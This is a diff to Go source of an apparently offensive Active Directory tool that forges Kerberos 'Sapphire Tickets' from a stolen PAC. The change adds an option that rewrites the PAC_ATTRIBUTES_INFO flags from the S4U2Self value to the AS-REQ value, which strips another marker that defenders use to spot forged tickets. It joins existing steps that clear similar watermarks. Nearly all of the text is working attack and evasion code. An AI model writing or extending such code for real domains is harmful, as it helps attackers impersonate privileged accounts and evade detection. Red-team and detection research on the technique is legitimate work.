@@ -188,6 +188,10 @@ type SapphireTicketRequest struct {
 	// KERB_VALIDATION_INFO.UserFlags before re-signing. This is a second S4U2Self
 	// watermark in the PAC, separate from S-1-18-2.
 	StripLogonFlags bool
+
+	// StripPACAttributes rewrites PAC_ATTRIBUTES_INFO.Flags from 0x2
+	// (PAC_WAS_GIVEN_IMPLICITLY, S4U2Self) to 0x1 (PAC_WAS_REQUESTED, AS-REQ).
+	StripPACAttributes bool
 }
 
 // SapphireTicketResult contains the Sapphire Ticket.
@@ -470,6 +474,19 @@ func ForgeSapphireTicket(ctx context.Context, req *SapphireTicketRequest) (*Sapp
 			fmt.Printf("[+] Cleared LOGON_RESOURCE_GROUPS in %d UserFlags field(s)\n", n)
 		} else {
 			fmt.Println("[!] No UserFlags=0x220 pattern found (PAC may not carry this watermark)")
+		}
+	}
+
+	// Step 3.77: Optionally rewrite PAC_ATTRIBUTES_INFO.Flags from
+	// PAC_WAS_GIVEN_IMPLICITLY (0x2, S4U2Self) to PAC_WAS_REQUESTED (0x1, AS-REQ).
+	if req.StripPACAttributes {
+		fmt.Println("[*] Step 3.77: Rewriting PAC_ATTRIBUTES_INFO flags 0x2 → 0x1...")
+		var n int
+		stolenPAC, n = pac.RewritePACAttributesRequested(stolenPAC)
+		if n > 0 {
+			fmt.Printf("[+] Rewrote PAC_ATTRIBUTES_INFO flags in %d buffer(s)\n", n)
+		} else {
+			fmt.Println("[!] PAC_ATTRIBUTES_INFO flags already = 0x1 or buffer absent")
 		}
 	}
 
